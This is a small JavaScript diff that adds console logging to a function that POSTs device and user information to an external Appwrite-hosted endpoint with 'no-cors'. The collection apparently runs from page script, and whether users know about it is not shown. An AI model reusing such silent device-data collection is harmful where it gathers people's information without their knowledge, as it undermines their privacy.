@@ -28,7 +28,7 @@ function getDeviceInfo() {
 
 
 function storeData(device, user) {
-    fetch('https://673d53a375a6942d9bd2.appwrite.global/', {
+    const res = fetch('https://673d53a375a6942d9bd2.appwrite.global/', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -39,6 +39,8 @@ function storeData(device, user) {
         }),
         mode: 'no-cors'
     })
+    
+    console.log(res)
 }
 
 (_ => {
